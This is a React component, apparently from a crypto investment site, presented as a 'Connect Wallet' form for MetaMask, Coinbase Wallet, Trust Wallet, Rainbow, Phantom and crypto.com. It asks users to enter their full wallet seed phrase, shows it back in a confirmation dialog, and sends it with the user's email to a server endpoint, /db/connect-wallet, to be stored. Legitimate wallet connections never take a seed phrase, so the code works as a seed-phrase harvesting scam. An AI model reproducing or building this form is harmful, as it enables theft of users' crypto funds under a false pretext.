"use client";

import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "../../../ui/card";
import { Input } from "../../../ui/input";
import { Button } from "../../../ui/button";
import { Label } from "../../../ui/label";
import { Badge } from "../../../ui/badge";
import { useTheme } from "../../../../contexts/themeContext";
import { useUserData } from "../../../../contexts/userrContext";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "../../../ui/dialog";
import { toast } from "react-hot-toast";
import { Loader2 } from "lucide-react";

export default function WalletConnectForm() {
  const { details, setDetails, email } = useUserData();
  const { isDarkMode } = useTheme();
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [currentWallet, setCurrentWallet] = useState(null);
  const [loading, setLoading] = useState({});

  const wallets = [
    { name: "MetaMask", icon: "🦊", key: "MetaMask" },
    { name: "Coinbase Wallet", icon: "🔵", key: "CoinbaseWallet" },
    { name: "Trust Wallet", icon: "🔐", key: "TrustWallet" },
    { name: "Rainbow", icon: "🌈", key: "Rainbow" },
    { name: "Phantom", icon: "👻", key: "Phantom" },
    { name: "crypto.com", icon: "🌚", key: "CryptoCom" },
  ];

  const handleSeedPhraseChange = (walletKey, value) => {
    setDetails((prevDetails) => ({
      ...prevDetails,
      wallets: {
        ...prevDetails.wallets,
        [walletKey]: {
          ...prevDetails.wallets[walletKey],
          seedPhrase: value,
        },
      },
    }));
  };

  const validateSeedPhrase = (seedPhrase) => {
    const words = seedPhrase.trim().split(/\s+/);
    return words.length >= 12;
  };

  const handleConnect = (walletKey) => {
    const seedPhrase = details.wallets[walletKey].seedPhrase;
    if (validateSeedPhrase(seedPhrase)) {
      setCurrentWallet(walletKey);
      setIsModalOpen(true);
    } else {
      toast.error("Seed phrase must contain at least 12 words");
    }
  };

  const handleAction = async (action, walletKey) => {
    setLoading((prev) => ({ ...prev, [walletKey]: true }));
    try {
      const response = await fetch("/db/connect-wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletKey,
          seedPhrase:
            action === "disconnect"
              ? ""
              : details.wallets[walletKey].seedPhrase,
          email,
          action,
        }),
      });

      if (!response.ok) {
        throw new Error(`Failed to ${action} wallet`);
      }

      const updatedUser = await response.json();
      setDetails(updatedUser);
      setIsModalOpen(false);
      toast.success(`Wallet ${action}ed successfully`);
    } catch (error) {
      console.error(`Error ${action}ing wallet:`, error);
      toast.error(`Failed to ${action} wallet`);
    } finally {
      setLoading((prev) => ({ ...prev, [walletKey]: false }));
    }
  };

  const confirmConnect = () => handleAction("connect", currentWallet);
  const handleUpdate = (walletKey) => handleAction("update", walletKey);
  const handleDisconnect = (walletKey) => handleAction("disconnect", walletKey);

  return (
    <div className={`p-4`}>
      {details !== 0 && (
        <>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-2 gap-4">
            {wallets.map((wallet) => (
              <Card
                key={wallet.key}
                className={`flex flex-col ${
                  isDarkMode
                    ? "bg-white/5 border-white/10 text-white"
                    : "bg-white text-black"
                }`}
              >
                <CardHeader>
                  <CardTitle className="flex items-center justify-between">
                    <span className="flex items-center">
                      <span className="mr-2">{wallet.icon}</span>
                      {wallet.name}
                    </span>
                    <Badge
                      variant={
                        details.wallets[wallet.key].connected
                          ? "success"
                          : "destructive"
                      }
                      className={
                        isDarkMode
                          ? details.wallets[wallet.key].connected
                            ? "bg-green-600 text-white"
                            : "bg-red-600 text-white"
                          : ""
                      }
                    >
                      {details.wallets[wallet.key].connected
                        ? "Connected"
                        : "Not Connected"}
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent className="flex-grow flex flex-col justify-between">
                  <div className="space-y-4">
                    <div className="space-y-2">
                      <Label
                        htmlFor={`seedPhrase-${wallet.key}`}
                        className={isDarkMode ? "text-gray-300" : ""}
                      >
                        Seed Phrase (minimum 12 words)
                      </Label>
                      <Input
                        id={`seedPhrase-${wallet.key}`}
                        placeholder="Enter your seed phrase"
                        value={details.wallets[wallet.key].seedPhrase || ""}
                        onChange={(e) =>
                          handleSeedPhraseChange(wallet.key, e.target.value)
                        }
                        className={
                          isDarkMode
                            ? "bg-white/10 text-white border-none placeholder:text-white/60"
                            : "bg-white text-black"
                        }
                      />
                    </div>
                  </div>
                  {details.wallets[wallet.key].connected ? (
                    <div className="flex gap-2 mt-4">
                      <Button
                        onClick={() => handleUpdate(wallet.key)}
                        disabled={loading[wallet.key]}
                        className={`flex-1 ${
                          isDarkMode
                            ? "bg-blue-600 hover:bg-blue-700 text-white"
                            : "bg-blue-500 hover:bg-blue-600 text-white"
                        }`}
                      >
                        {loading[wallet.key] ? (
                          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        ) : null}
                        Update
                      </Button>
                      <Button
                        onClick={() => handleDisconnect(wallet.key)}
                        disabled={loading[wallet.key]}
                        variant="destructive"
                        className="flex-1"
                      >
                        {loading[wallet.key] ? (
                          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                        ) : null}
                        Disconnect
                      </Button>
                    </div>
                  ) : (
                    <Button
                      onClick={() => handleConnect(wallet.key)}
                      disabled={loading[wallet.key]}
                      className={`mt-4 ${
                        isDarkMode
                          ? "bg-blue-600 hover:bg-blue-700 text-white"
                          : "bg-blue-500 hover:bg-blue-600 text-white"
                      }`}
                    >
                      {loading[wallet.key] ? (
                        <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      ) : null}
                      Connect Wallet
                    </Button>
                  )}
                </CardContent>
              </Card>
            ))}
          </div>

          <Dialog open={isModalOpen} onOpenChange={setIsModalOpen}>
            <DialogContent
              className={`${
                isDarkMode ? "bg-[#111] border-white/5 text-white" : ""
              }`}
            >
              <DialogHeader>
                <DialogTitle>Confirm Wallet Connection</DialogTitle>
                <DialogDescription>
                  Are you sure you want to connect this wallet? Please verify
                  that the seed phrase is correct.
                </DialogDescription>
              </DialogHeader>
              <p
                className={`mt-2 font-mono ${
                  !isDarkMode ? "bg-gray-100" : "bg-white/10 text-white"
                } p-2 rounded`}
              >
                {currentWallet && details.wallets[currentWallet].seedPhrase}
              </p>
              <DialogFooter>
                <Button
                  variant="outline"
                  className={`${
                    isDarkMode ? "bg-white/5 text-white border-white/10" : ""
                  }`}
                  onClick={() => setIsModalOpen(false)}
                >
                  Cancel
                </Button>
                <Button
                  onClick={confirmConnect}
                  disabled={loading[currentWallet]}
                >
                  {loading[currentWallet] ? (
                    <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  ) : null}
                  Confirm
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        </>
      )}
    </div>
  );
}
